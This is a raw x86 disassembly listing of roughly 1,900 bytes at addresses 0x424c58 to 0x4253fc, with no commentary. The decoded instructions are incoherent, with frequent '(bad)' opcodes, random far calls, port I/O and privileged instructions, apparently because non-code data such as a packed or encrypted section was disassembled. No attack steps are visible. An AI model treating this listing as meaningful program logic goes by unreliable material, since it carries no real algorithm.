  424c58:	mov    cl,BYTE PTR [ebp+0x42]
  424c5b:	lds    edx,FWORD PTR [esi-0x11]
  424c5e:	cdq    
  424c5f:	jne    0x424cb2
  424c61:	xchg   edx,eax
  424c62:	sub    ah,BYTE PTR [edx+0x43]
  424c65:	repz fistp QWORD PTR [ebx+0x61]
  424c69:	jmp    0x37d3f3dd
  424c6e:	jno    0x424cb6
  424c70:	sub    BYTE PTR [esi],bh
  424c72:	and    cl,0x9c
  424c75:	cmp    edx,eax
  424c77:	cmp    eax,0xd68ac8b2
  424c7c:	pop    edx
  424c7d:	pop    ebp
  424c7e:	xor    BYTE PTR [edi-0x9575f29],ah
  424c84:	das    
  424c85:	data16 aam 0x37
  424c88:	mov    ebp,DWORD PTR [ecx-0x52]
  424c8b:	daa    
  424c8c:	or     al,BYTE PTR [esi+0x3b]
  424c8f:	mov    BYTE PTR [eax-0x6b],dh
  424c92:	das    
  424c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c94:	sbb    cl,BYTE PTR [eax]
  424c96:	adc    DWORD PTR [edi-0x62],ebp
  424c99:	outs   dx,BYTE PTR ds:[esi]
  424c9a:	push   ebx
  424c9b:	mov    DWORD PTR [ebx+ebp*4+0xb821b0a],edi
  424ca2:	jne    0x424c5e
  424ca4:	push   ds
  424ca5:	xlat   BYTE PTR ds:[ebx]
  424ca6:	mov    ds:0xa60bb5df,al
  424cab:	pop    eax
  424cac:	aad    0x29
  424cae:	sbb    eax,DWORD PTR [ecx+0x6f]
  424cb1:	or     eax,0x1db719a2
  424cb6:	push   edx
  424cb7:	jno    0x424c6b
  424cb9:	lock pslld mm5,QWORD PTR [eax+0x45a7c433]
  424cc1:	cwde   
  424cc2:	xlat   BYTE PTR ds:[ebx]
  424cc3:	jnp    0x424c92
  424cc5:	mov    ebp,0xa4b33ff8
  424cca:	lods   eax,DWORD PTR ds:[esi]
  424ccb:	fbstp  TBYTE PTR [ebp-0x33]
  424cce:	mov    ecx,0x54165ef5
  424cd3:	mov    ch,0xf9
  424cd5:	push   ds
  424cd6:	mov    esp,DWORD PTR [edx+edx*4+0x72973226]
  424cdd:	sub    eax,0x82b24e43
  424ce2:	ins    BYTE PTR es:[edi],dx
  424ce3:	lahf   
  424ce4:	test   DWORD PTR [ebp-0x7f],eax
  424ce7:	ja     0x424d34
  424ce9:	or     ecx,eax
  424ceb:	mov    WORD PTR [ebx+ecx*2],ss
  424cee:	mov    dl,0x37
  424cf0:	sbb    bl,BYTE PTR [edx+ebx*4-0x5e]
  424cf4:	retf   
  424cf5:	jno    0x424d72
  424cf7:	mov    dh,BYTE PTR [edi]
  424cf9:	add    al,BYTE PTR [ebx-0x59]
  424cfc:	or     al,0x8d
  424cfe:	push   edx
  424cff:	pop    ebx
  424d00:	cmp    DWORD PTR [edx],edi
  424d02:	add    cl,BYTE PTR [ebx+0x140eddb2]
  424d08:	xor    ah,BYTE PTR [esi-0x44436280]
  424d0e:	dec    esi
  424d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d10:	jns    0x424cc9
  424d12:	out    0x12,eax
  424d14:	lock add al,0xbb
  424d17:	cwde   
  424d18:	sahf   
  424d19:	out    dx,eax
  424d1a:	in     al,dx
  424d1b:	(bad)  
  424d1c:	mov    dl,0x79
  424d1e:	pop    edx
  424d1f:	arpl   WORD PTR [eax+ecx*4+0x51],bp
  424d23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d24:	jae    0x424d41
  424d26:	dec    esi
  424d27:	aam    0x67
  424d29:	push   eax
  424d2a:	je     0x424d0a
  424d2c:	inc    esi
  424d2d:	test   eax,0xeeb2caed
  424d32:	das    
  424d33:	xor    eax,0x2aa21cf4
  424d38:	lock or esi,ebx
  424d3b:	or     ebx,ebp
  424d3d:	mov    dl,0x21
  424d3f:	and    al,0x94
  424d41:	mov    bh,0xa5
  424d43:	and    DWORD PTR [ebx+0x60f3ae8b],edi
  424d49:	inc    esi
  424d4a:	lods   al,BYTE PTR ds:[esi]
  424d4b:	xor    eax,0xc9eb0a71
  424d50:	ror    BYTE PTR [eax],cl
  424d52:	mov    esi,DWORD PTR [edx+0x52]
  424d55:	jecxz  0x424dc6
  424d57:	pop    ebp
  424d58:	mov    dl,0x4
  424d5a:	dec    ecx
  424d5b:	inc    ecx
  424d5c:	mov    dh,BYTE PTR [esi-0x34005c37]
  424d62:	cld    
  424d63:	xor    cl,BYTE PTR [ebx-0x4dbcf834]
  424d69:	xchg   ebx,eax
  424d6a:	xchg   ebx,eax
  424d6b:	inc    edx
  424d6c:	aad    0x9a
  424d6e:	cli    
  424d6f:	adc    bh,BYTE PTR [eax+0xb]
  424d72:	data16 or BYTE PTR [ecx],dl
  424d75:	mov    ecx,DWORD PTR [eax+0x7c]
  424d78:	popf   
  424d79:	into   
  424d7a:	call   0x3a09:0x815a64b9
  424d81:	xchg   edx,eax
  424d82:	sub    al,0x47
  424d84:	fwait
  424d85:	or     edx,DWORD PTR [esp+edi*8+0x76e4282c]
  424d8c:	mov    ebx,0x184db664
  424d91:	jns    0x424d2d
  424d93:	mov    ?,WORD PTR ds:[ebp+eax*4+0x4c]
  424d98:	sahf   
  424d99:	or     edx,edx
  424d9b:	dec    edi
  424d9c:	ss xchg ebx,eax
  424d9e:	or     dl,dh
  424da0:	(bad)  
  424da2:	call   0x9637ffdd
  424da7:	jne    0x424db5
  424da9:	jne    0x424d76
  424dab:	add    bh,ah
  424dad:	call   DWORD PTR [edi+0x17]
  424db0:	cwde   
  424db1:	shrd   DWORD PTR [edx+ecx*4-0x30],ebx,0xa6
  424db7:	sbb    edi,DWORD PTR fs:[edx+eiz*1]
  424dbb:	jecxz  0x424dc8
  424dbd:	out    dx,al
  424dbe:	call   0xb4450002
  424dc3:	ds xchg edx,eax
  424dc5:	jmp    0xeee:0xb4e81f0
  424dcc:	cmp    al,0x1f
  424dce:	or     al,0x5a
  424dd0:	mov    edi,0xaeb29ace
  424dd5:	das    
  424dd6:	rol    edi,1
  424dd8:	popf   
  424dd9:	and    cl,BYTE PTR [ebp+0x5d]
  424ddc:	retf   
  424ddd:	or     edx,DWORD PTR [ebp-0x174c5d8d]
  424de3:	push   0xffffff93
  424de5:	ret    
  424de6:	call   0x1778:0xcf1dfb63
  424ded:	jp     0x424d6f
  424def:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424df0:	sub    al,0x73
  424df2:	xor    DWORD PTR ds:0xecdaf51b,ebx
  424df8:	mov    BYTE PTR [ecx-0x51],cl
  424dfb:	cmp    ch,BYTE PTR [eax+esi*1-0x31eee426]
  424e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e03:	inc    esp
  424e04:	add    DWORD PTR [ebx],ecx
  424e06:	xor    al,0xc6
  424e08:	retf   0xef54
  424e0b:	add    DWORD PTR [ebp-0xb43652b],eax
  424e11:	in     eax,dx
  424e12:	and    dl,al
  424e14:	add    eax,0x68556376
  424e19:	or     eax,DWORD PTR [ebp+edi*8-0x2b78b429]
  424e20:	or     al,0xde
  424e22:	call   0x30ff:0x556d02e8
  424e29:	push   cs
  424e2a:	mov    ebx,0x93b22fa7
  424e2f:	rcl    BYTE PTR [esi],0x7e
  424e32:	and    eax,0x875cb17c
  424e37:	hlt    
  424e38:	and    al,0x9f
  424e3a:	mov    dl,0x7f
  424e3c:	fisttp DWORD PTR [edx+0x3537a765]
  424e42:	push   0x1b
  424e44:	stc    
  424e45:	pop    ecx
  424e46:	dec    edi
  424e47:	or     BYTE PTR [edx+0x2397f9e4],dh
  424e4d:	mov    edi,0x357750c3
  424e52:	adc    eax,0x691732d5
  424e57:	pop    edx
  424e58:	pop    edx
  424e59:	adc    esi,DWORD PTR [edx-0x162149de]
  424e5f:	sub    ecx,DWORD PTR [edi]
  424e61:	out    0x5a,al
  424e63:	js     0x424df9
  424e65:	and    ch,BYTE PTR [edx-0x67]
  424e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e69:	xor    al,0x42
  424e6b:	mov    eax,ds:0x9b256eb2
  424e70:	scas   al,BYTE PTR es:[edi]
  424e71:	jbe    0x424ede
  424e73:	or     eax,0xc971e5b2
  424e78:	add    al,0x85
  424e7a:	push   esp
  424e7b:	inc    eax
  424e7c:	pop    esi
  424e7d:	or     ebp,ebp
  424e7f:	xchg   esi,eax
  424e80:	xchg   edx,eax
  424e81:	fs sbb al,0x2b
  424e84:	cdq    
  424e85:	jo     0x424e21
  424e87:	mov    ebx,0xcbfbf91
  424e8c:	int3   
  424e8d:	fcom   QWORD PTR [ecx]
  424e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e90:	push   0x44
  424e92:	xor    BYTE PTR [ecx-0x1283f958],bl
  424e98:	mov    dl,0x4b
  424e9a:	sbb    BYTE PTR [ecx],al
  424e9c:	xor    cl,BYTE PTR [edx]
  424e9e:	pushf  
  424e9f:	or     al,0x2d
  424ea1:	or     eax,DWORD PTR [edi+edi*8+0x17c83ae8]
  424ea8:	pop    ss
  424ea9:	and    al,0x9a
  424eab:	pusha  
  424eac:	in     eax,dx
  424ead:	pushf  
  424eae:	add    al,0x61
  424eb0:	mov    ebx,0x53a7e2a6
  424eb5:	adc    BYTE PTR ds:0x1a36514a,0xc9
  424ebc:	mov    dl,0x7e
  424ebe:	cli    
  424ebf:	idiv   al
  424ec1:	cwde   
  424ec2:	mov    dl,0x6d
  424ec4:	fimul  WORD PTR [ebx]
  424ec6:	pop    edx
  424ec7:	or     DWORD PTR [eax+0x6f3aab9d],eax
  424ecd:	xor    al,0x74
  424ecf:	es int3 
  424ed1:	xor    BYTE PTR [edx-0x47ef14be],bl
  424ed7:	jae    0x424f39
  424ed9:	cmp    bh,0xa7
  424edc:	pop    edi
  424edd:	cmp    esi,esi
  424edf:	in     eax,dx
  424ee0:	mov    ds:0xb2d39343,eax
  424ee5:	inc    esi
  424ee6:	imul   edx,DWORD PTR [eax+0x7a],0xe3431b7d
  424eed:	or     edi,DWORD PTR [ebp-0x72]
  424ef0:	(bad)  
  424ef1:	jmp    0x4a7087a6
  424ef6:	mov    dh,0x82
  424ef8:	dec    ebx
  424ef9:	call   0x2cda:0x50d7f29a
  424f00:	inc    edx
  424f01:	add    DWORD PTR [ebx-0x38],esi
  424f04:	inc    edi
  424f05:	retf   
  424f06:	pop    ss
  424f07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f08:	sbb    eax,ebp
  424f0a:	adc    ch,BYTE PTR [esi]
  424f0c:	push   edx
  424f0d:	scas   al,BYTE PTR es:[edi]
  424f0e:	call   0xdf8d:0x8e9624bf
  424f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f16:	cmp    bh,BYTE PTR [eax-0x589167d2]
  424f1c:	push   ebp
  424f1d:	sar    cl,0x4d
  424f20:	rcl    ah,0xa2
  424f23:	nop
  424f24:	add    BYTE PTR [ebx-0x1a7060e9],cl
  424f2a:	or     DWORD PTR [ebx+0x13],edi
  424f2d:	or     al,0x3f
  424f2f:	adc    ebx,ebp
  424f31:	pushf  
  424f32:	pop    edi
  424f33:	xor    al,0x4d
  424f35:	bnd jb 0x424eca
  424f38:	xor    eax,0x89459ba6
  424f3d:	inc    edi
  424f3e:	pop    edx
  424f3f:	fstp   QWORD PTR [esi]
  424f41:	and    al,0x42
  424f43:	adc    DWORD PTR [edx+0xc],ebx
  424f46:	(bad)  
  424f47:	mov    ebx,0xd74a4331
  424f4c:	xchg   edx,eax
  424f4d:	push   esi
  424f4e:	fisttp WORD PTR [ebx-0x34336c49]
  424f54:	fdivr  DWORD PTR [ecx]
  424f56:	xchg   esp,eax
  424f57:	dec    esp
  424f58:	push   edx
  424f59:	or     eax,ebx
  424f5b:	adc    edx,DWORD PTR [esi-0x75]
  424f5e:	and    BYTE PTR [edi-0x5e073145],0xc1
  424f65:	pop    ebx
  424f66:	cmp    BYTE PTR [esi-0x4e],al
  424f69:	cs pop esi
  424f6b:	stos   DWORD PTR es:[edi],eax
  424f6c:	mov    bh,0x1c
  424f6e:	mov    esp,DWORD PTR [ebp+0x59]
  424f71:	or     ecx,DWORD PTR [ebx-0x2e]
  424f74:	sub    ebp,esp
  424f76:	aaa    
  424f77:	das    
  424f78:	xchg   ebp,eax
  424f79:	inc    esi
  424f7a:	call   0x365c:0xb42bf9e6
  424f81:	cmp    al,0xfb
  424f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f84:	mov    eax,0xd9bad642
  424f89:	loop   0x424ff6
  424f8b:	xor    BYTE PTR [edx+0x40d42b10],0xbd
  424f92:	repnz cwde 
  424f94:	cmp    ecx,DWORD PTR [ebx]
  424f96:	sbb    DWORD PTR [eax+0x44],eax
  424f99:	cmp    DWORD PTR [edi],esp
  424f9b:	xor    al,0xf5
  424f9d:	jno    0x424f32
  424f9f:	push   edx
  424fa0:	test   ch,ah
  424fa2:	or     eax,0xbc0f325a
  424fa7:	inc    esp
  424fa8:	clc    
  424fa9:	mov    bl,ch
  424fab:	repz mov ch,0xab
  424fae:	inc    ebx
  424faf:	ins    BYTE PTR es:[edi],dx
  424fb0:	cmp    al,0xfa
  424fb2:	jmp    0x1089:0x8df6c1ff
  424fb9:	das    
  424fba:	call   FWORD PTR [edi+0x44077eb2]
  424fc0:	iret   
  424fc1:	inc    ebx
  424fc2:	sbb    dl,cl
  424fc4:	shl    DWORD PTR [ecx+0x67249ebc],0x9a
  424fcb:	adc    eax,0xf4c35417
  424fd0:	inc    ecx
  424fd1:	xor    eax,0xcc644d3
  424fd6:	test   ah,0xc8
  424fd9:	jmp    0x594f3784
  424fde:	pusha  
  424fdf:	xor    esi,DWORD PTR [edx-0x27a8c188]
  424fe5:	xor    BYTE PTR [ecx],dl
  424fe7:	stos   BYTE PTR es:[edi],al
  424fe8:	psllw  mm4,QWORD PTR [ebx+0x3c464ba7]
  424fef:	xor    BYTE PTR [esi],cl
  424ff1:	cmp    DWORD PTR [edx],ecx
  424ff3:	mov    al,0xaf
  424ff5:	pop    ds
  424ff6:	int    0x87
  424ff8:	dec    ecx
  424ff9:	or     edi,DWORD PTR [ebx]
  424ffb:	repz jo 0x42504b
  424ffe:	in     al,0x1f
  425000:	dec    eax
  425001:	or     ebx,edx
  425003:	out    dx,al
  425004:	and    ebx,DWORD PTR [ecx]
  425006:	mov    cl,0xd5
  425008:	ins    BYTE PTR es:[edi],dx
  425009:	test   DWORD PTR [ecx-0x62624f0e],ecx
  42500f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425010:	leave  
  425011:	lods   al,BYTE PTR ds:[esi]
  425012:	retf   0xebff
  425015:	dec    eax
  425016:	pop    ebx
  425017:	popf   
  425018:	enter  0x1a44,0xc
  42501c:	ins    DWORD PTR es:[edi],dx
  42501d:	add    ah,BYTE PTR [esi+0x6f]
  425020:	mov    esp,0xd139906
  425025:	icebp  
  425026:	inc    edx
  425027:	pop    edx
  425028:	jno    0x425025
  42502a:	in     eax,0x36
  42502c:	lea    ecx,[ebx]
  42502e:	adc    DWORD PTR [esi-0x11],ebp
  425031:	adc    BYTE PTR [edi],bh
  425033:	std    
  425034:	sbb    DWORD PTR [esi+0x42300785],esi
  42503a:	pop    es
  42503b:	dec    esi
  42503c:	repnz mov esp,0x44fe114e
  425042:	cmp    al,0xa7
  425044:	push   ebp
  425045:	pop    ebp
  425046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425047:	mov    ebx,0x145c901b
  42504c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42504d:	sbb    BYTE PTR [edx-0x5b],ch
  425050:	mov    ch,0xd2
  425052:	fnstcw WORD PTR [ecx]
  425054:	xchg   edx,eax
  425055:	loope  0x42500b
  425057:	push   ecx
  425058:	mov    edi,0xf69af50b
  42505d:	(bad)  
  42505e:	push   ds
  42505f:	lea    eax,[eax-0x72]
  425062:	xchg   BYTE PTR [ebx-0x73],al
  425065:	neg    DWORD PTR [edx]
  425067:	imul   ebx,DWORD PTR [edx-0x3f],0x87a85da
  42506e:	repz out 0x80,al
  425071:	xchg   ebp,eax
  425072:	repnz daa 
  425074:	push   ebp
  425075:	mov    ebp,DWORD PTR [ebp-0x38]
  425078:	cmp    ebp,DWORD PTR [esi-0xb9ce266]
  42507e:	sub    BYTE PTR [ecx-0x59332b07],0xc5
  425085:	adc    cl,BYTE PTR [edx-0x31]
  425088:	xchg   ecx,eax
  425089:	add    al,0x11
  42508b:	outs   dx,DWORD PTR ds:[esi]
  42508c:	call   0xfb22edc0
  425091:	jb     0x425015
  425093:	nop
  425094:	mov    ds:0xdc07392b,al
  425099:	das    
  42509a:	inc    ebp
  42509b:	popa   
  42509c:	call   0xd092:0x5822750b
  4250a3:	xor    DWORD PTR [edx+0x7217a524],0xffffffa9
  4250aa:	inc    ebx
  4250ab:	stos   BYTE PTR es:[edi],al
  4250ac:	jg     0x4250ba
  4250ae:	and    edx,edx
  4250b0:	icebp  
  4250b1:	xchg   ecx,eax
  4250b2:	leave  
  4250b3:	ja     0x4250d4
  4250b5:	ja     0x425122
  4250b7:	xchg   BYTE PTR [edi+0xe3e0a5c],dh
  4250bd:	dec    ebp
  4250be:	call   0xca38:0x9ce31b14
  4250c5:	or     edx,ebp
  4250c7:	inc    esp
  4250c8:	jns    0x4250b8
  4250ca:	push   edx
  4250cb:	sub    esp,DWORD PTR [bx+di]
  4250ce:	call   0x6afe:0x3ded6492
  4250d5:	mov    eax,ds:0x2200a78c
  4250da:	or     eax,0x93260db3
  4250df:	mov    al,ds:0x9c958c8f
  4250e4:	mov    edx,0x66bc9f8b
  4250e9:	sti    
  4250ea:	enter  0xe127,0xb
  4250ee:	pop    esp
  4250ef:	dec    edx
  4250f0:	jge    0x425116
  4250f2:	int3   
  4250f3:	xchg   edx,eax
  4250f4:	ins    BYTE PTR es:[edi],dx
  4250f5:	adc    al,0x9a
  4250f7:	pop    edi
  4250f8:	nop
  4250f9:	je     0x4250da
  4250fb:	ds jl  0x4250e7
  4250fe:	jle    0x4250a7
  425100:	loopne 0x425136
  425102:	loopne 0x4250af
  425104:	mov    cl,0x3c
  425106:	push   edi
  425107:	int    0x88
  425109:	mov    esi,0x9aab2861
  42510e:	ret    
  42510f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425110:	and    ah,BYTE PTR [ecx+ebp*8]
  425113:	dec    ebx
  425114:	dec    edx
  425115:	push   cs
  425116:	outs   dx,BYTE PTR ds:[esi]
  425117:	test   eax,0x71bc3f77
  42511c:	push   edx
  42511d:	aam    0x83
  42511f:	add    BYTE PTR [ebx+0x34],ch
  425122:	xchg   esp,eax
  425123:	and    al,0xb9
  425125:	int    0xbf
  425127:	or     al,0x8a
  425129:	mov    eax,DWORD PTR [esi]
  42512b:	xor    eax,0xa7f97c37
  425130:	mov    BYTE PTR [ebx],bl
  425132:	pop    edx
  425133:	jg     0x42513c
  425135:	stos   DWORD PTR es:[edi],eax
  425136:	push   ebp
  425137:	mov    edx,0xf7a5a5bc
  42513c:	gs sub esp,edi
  42513f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425140:	out    dx,eax
  425141:	and    BYTE PTR [edi-0x59],ah
  425144:	imul   eax,DWORD PTR [edx],0x32
  425147:	in     eax,dx
  425148:	fisub  WORD PTR [edi*4-0x20344d81]
  42514f:	(bad)  
  425150:	retf   
  425151:	sbb    cl,bl
  425153:	xor    al,0x77
  425155:	or     ebp,DWORD PTR [esi]
  425157:	xchg   DWORD PTR [ebp-0x30],eax
  42515a:	add    al,0xc7
  42515c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42515d:	(bad)  
  42515e:	lahf   
  42515f:	test   DWORD PTR [ecx+0x322c3855],esi
  425165:	mov    eax,ds:0xb58d7f0
  42516a:	add    BYTE PTR [ebp+0x48712493],ch
  425170:	mov    edi,0xba3987b2
  425175:	mov    ch,0xda
  425177:	lock cmp al,0x71
  42517a:	popa   
  42517b:	icebp  
  42517c:	and    cl,BYTE PTR [ebx]
  42517e:	test   eax,0xb904087
  425183:	lods   al,BYTE PTR ds:[esi]
  425184:	add    esp,ebp
  425186:	lea    esi,[ebx+0x5f]
  425189:	mov    bh,0x9a
  42518b:	outs   dx,BYTE PTR ds:[esi]
  42518c:	retf   
  42518d:	cwde   
  42518e:	adc    DWORD PTR [eax+ecx*1-0x486c71f5],eax
  425195:	test   BYTE PTR [esi],ch
  425197:	pop    ebp
  425198:	and    eax,0xb647937f
  42519d:	and    al,0x56
  42519f:	daa    
  4251a0:	imul   edi,DWORD PTR gs:[ebx],0x2a701f3b
  4251a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251a8:	jb     0x4251fd
  4251aa:	and    ecx,DWORD PTR [eax-0x5b]
  4251ad:	dec    edi
  4251ae:	shl    BYTE PTR [ecx-0x4e],0xb1
  4251b2:	test   DWORD PTR [esi-0x551b7bd3],edx
  4251b8:	dec    esp
  4251b9:	push   ss
  4251ba:	(bad)  
  4251bb:	push   0x59
  4251bd:	or     DWORD PTR [edx],ebp
  4251bf:	cmp    DWORD PTR [edx-0x5f],edi
  4251c2:	jns    0x4251d2
  4251c4:	sbb    cl,BYTE PTR [edx]
  4251c6:	fsub   DWORD PTR ds:0xd5e48eb2
  4251cc:	jge    0x42522e
  4251ce:	pop    esi
  4251cf:	jnp    0x42518f
  4251d1:	add    al,BYTE PTR ds:0x958bd710
  4251d7:	outs   dx,DWORD PTR ds:[esi]
  4251d8:	jb     0x42523c
  4251da:	lea    ecx,[ecx]
  4251dc:	sbb    BYTE PTR [eax-0x66],cl
  4251df:	pop    ss
  4251e0:	mov    cl,0x47
  4251e2:	mov    al,ds:0x6cc905cf
  4251e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251e8:	lock rcl esp,0x8
  4251ec:	enter  0xb102,0x9b
  4251f0:	int    0xd3
  4251f2:	ins    BYTE PTR es:[edi],dx
  4251f3:	das    
  4251f4:	mov    dl,0xf
  4251f6:	test   ch,dl
  4251f8:	pop    es
  4251f9:	lods   al,BYTE PTR ds:[esi]
  4251fa:	out    dx,al
  4251fb:	sub    BYTE PTR [ebp+0x27f8f90b],dl
  425201:	sub    DWORD PTR [eax-0x32],edx
  425204:	out    0xba,al
  425206:	call   0x6dc3:0x6aa58391
  42520d:	bndstx [ebp-0x4dd21cd2],(bad)
  425214:	popf   
  425215:	xchg   esi,eax
  425216:	cli    
  425217:	out    dx,al
  425218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425219:	sub    al,0x9a
  42521b:	in     al,0x65
  42521d:	(bad)  [ebx]
  42521f:	aad    0x7c
  425221:	(bad)  
  425222:	pop    ebx
  425223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425224:	cmp    eax,DWORD PTR [ebp-0x21ba813c]
  42522a:	inc    edi
  42522b:	or     BYTE PTR [edi-0x18a29d89],dh
  425231:	ins    BYTE PTR es:[edi],dx
  425232:	sbb    al,cl
  425234:	ja     0x425237
  425236:	or     eax,0x9e3b14a4
  42523b:	pop    edx
  42523c:	and    esp,DWORD PTR [ecx+0x74d9175a]
  425242:	push   0xffffff8e
  425244:	pop    edx
  425245:	daa    
  425246:	call   0x47a8:0x85a9941f
  42524d:	push   eax
  42524e:	mov    edi,0x4e0e0a5
  425253:	nop
  425254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425255:	fucom  st(5)
  425257:	les    eax,FWORD PTR [esi+0x353b6afc]
  42525d:	out    0x3a,al
  42525f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425260:	lods   al,BYTE PTR ds:[esi]
  425261:	mov    esi,0xfc75242c
  425266:	popf   
  425267:	jmp    0xea79:0xf5a8aeb2
  42526e:	and    eax,0x8c02d4cc
  425273:	cmp    ebx,0xffffffb6
  425276:	sbb    bh,BYTE PTR [eax-0x5e]
  425279:	ret    
  42527a:	arpl   sp,di
  42527c:	mov    dl,0xa1
  42527e:	sub    eax,0xec431a98
  425283:	pop    es
  425284:	inc    edi
  425285:	or     edx,ebx
  425287:	and    ah,dl
  425289:	test   al,0x9e
  42528b:	fimul  DWORD PTR [ecx-0x75e76406]
  425291:	test   DWORD PTR [eax+0x6ea5c01e],ebp
  425297:	das    
  425298:	pop    ebx
  425299:	and    eax,DWORD PTR ds:0x880b515e
  42529f:	jl     0x4252c6
  4252a1:	push   ebp
  4252a2:	cs and eax,0xe79aa9b9
  4252a8:	mov    BYTE PTR [esi+0x68],bl
  4252ab:	mov    dl,0x3e
  4252ad:	jb     0x4252db
  4252af:	mov    ebx,0x2637fb7b
  4252b4:	std    
  4252b5:	stos   DWORD PTR es:[edi],eax
  4252b6:	jo     0x4252c8
  4252b8:	in     eax,dx
  4252b9:	sar    BYTE PTR [ecx],0x6
  4252bc:	bound  ebp,QWORD PTR [ecx+0x49bceee6]
  4252c2:	lock sbb DWORD PTR [ecx],ebx
  4252c5:	jmp    0x4252ab
  4252c7:	xor    BYTE PTR [ebx],al
  4252c9:	or     DWORD PTR [edi+eiz*4],0xa
  4252cd:	repz stc 
  4252cf:	loopne 0x4252aa
  4252d1:	dec    ebx
  4252d2:	pop    es
  4252d3:	ret    
  4252d4:	mov    ch,0x21
  4252d6:	ss dec eax
  4252d8:	test   al,0x25
  4252da:	rcl    BYTE PTR [eax-0x4e],1
  4252dd:	push   ebx
  4252de:	sub    al,0xe6
  4252e0:	push   ecx
  4252e1:	leave  
  4252e2:	mov    ch,0xac
  4252e4:	sbb    ebp,ebp
  4252e6:	adc    bl,bl
  4252e8:	mov    dl,0x1d
  4252ea:	in     al,0x7e
  4252ec:	scas   al,BYTE PTR es:[edi]
  4252ed:	mov    esi,0x7df6189a
  4252f2:	out    dx,al
  4252f3:	jp     0x4252be
  4252f5:	mov    esp,0x4e43a733
  4252fa:	stos   DWORD PTR es:[edi],eax
  4252fb:	xlat   BYTE PTR ds:[ebx]
  4252fc:	call   0xb2516389
  425301:	mov    eax,0x43dca078
  425306:	div    eax
  425308:	pop    eax
  425309:	or     edx,DWORD PTR [ebp+0x17]
  42530c:	inc    ebp
  42530d:	lahf   
  42530e:	mov    cl,0x1e
  425310:	stos   DWORD PTR es:[edi],eax
  425311:	aas    
  425312:	js     0x425335
  425314:	jb     0x425349
  425316:	fist   WORD PTR [ebx]
  425318:	xor    BYTE PTR [esi+0x62],0xa8
  42531c:	mov    bl,0xd5
  42531e:	arpl   WORD PTR [ebx],sp
  425320:	std    
  425321:	ja     0x42533d
  425323:	mov    ebx,DWORD PTR [esi-0x6d]
  425326:	inc    eax
  425327:	adc    eax,0xfa3655ad
  42532c:	xor    cl,BYTE PTR [esi-0x74]
  42532f:	adc    al,0x51
  425331:	sahf   
  425332:	or     al,0xa7
  425334:	sbb    al,cl
  425336:	push   edi
  425337:	ror    BYTE PTR [edx+ebx*8+0x1048465f],1
  42533e:	out    dx,al
  42533f:	gs mov dl,0xa8
  425342:	mov    esi,0x464c7e6f
  425347:	push   esp
  425348:	ret    
  425349:	or     dh,BYTE PTR [eax]
  42534b:	adc    bh,BYTE PTR [ebx]
  42534d:	xor    BYTE PTR [ebx],ch
  42534f:	iret   
  425350:	xlat   BYTE PTR es:[ebx]
  425352:	cwde   
  425353:	addr16 int3 
  425355:	push   ds
  425356:	xchg   ebp,eax
  425357:	mov    DWORD PTR [ecx],0x12a70a36
  42535d:	mov    dl,0x91
  42535f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425360:	ret    
  425361:	or     ecx,ebp
  425363:	idiv   DWORD PTR [ebp+0x3d]
  425366:	popa   
  425367:	loope  0x425397
  425369:	jne    0x425308
  42536b:	inc    ebp
  42536c:	je     0x425384
  42536e:	stc    
  42536f:	aam    0x5c
  425371:	mov    eax,DWORD PTR [ecx]
  425373:	or     edx,ebx
  425375:	pop    ds
  425376:	jo     0x425352
  425378:	or     al,BYTE PTR ds:0xce89ecef
  42537e:	pop    edx
  42537f:	mov    dl,BYTE PTR ds:[ecx+0x18]
  425383:	cdq    
  425384:	mov    dl,0x22
  425386:	cmovbe ecx,esi
  425389:	jbe    0x425365
  42538b:	sbb    BYTE PTR [ecx],bh
  42538d:	or     BYTE PTR [edi+esi*1-0x14],cl
  425391:	lahf   
  425392:	pop    eax
  425393:	jmp    0x5809479b
  425398:	xor    eax,0x23de9a4e
  42539d:	or     al,0x59
  42539f:	sub    DWORD PTR [edi+edx*8-0x638d58a3],0xffffffef
  4253a7:	jne    0x4253a4
  4253a9:	xchg   ebp,eax
  4253aa:	std    
  4253ab:	dec    eax
  4253ac:	mov    dl,0x18
  4253ae:	mov    edi,0x13e11b52
  4253b3:	lock ins DWORD PTR es:[edi],dx
  4253b5:	or     ecx,DWORD PTR [ecx+esi*8-0x294edb07]
  4253bc:	aas    
  4253bd:	push   ss
  4253be:	fwait
  4253bf:	rol    BYTE PTR [ebx+0x2fc6a3ae],0xc1
  4253c6:	data16 out dx,al
  4253c8:	(bad)  ds:0xb727693
  4253ce:	rcr    DWORD PTR [ebx+0x1e],0x54
  4253d2:	out    dx,eax
  4253d3:	or     dh,BYTE PTR [ebx+0x29dd5422]
  4253d9:	adc    eax,0xf2726f80
  4253de:	xor    esp,DWORD PTR [esi+0x898edc5]
  4253e4:	stc    
  4253e5:	mov    eax,ds:0xe8d1d7ee
  4253ea:	call   0x9bd2:0xfe6b78de
  4253f1:	in     eax,0x1d
  4253f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253f4:	mov    eax,ds:0x557cc7ea
  4253f9:	les    ebx,FWORD PTR [edx+0x35]
  4253fc:	or     bh,BYTE PTR [edx-0x66]
